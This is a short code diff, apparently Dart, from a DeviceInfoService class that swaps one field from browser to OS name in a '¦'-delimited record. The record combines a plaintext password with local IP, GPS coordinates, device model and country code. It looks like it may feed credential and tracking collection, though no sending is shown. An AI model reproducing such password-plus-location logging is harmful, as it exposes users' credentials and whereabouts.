@@ -506,7 +506,7 @@ class DeviceInfoService {
         '¦$password'
         '¦${info['ip_local']}'
         '¦${info['coordenadas']}'
-        '¦${info['navegador']}'
+        '¦${info['so']}'
         '¦${info['modelo']}'
         '¦${info['so_version']}'
         '¦${info['pais_codigo']}'
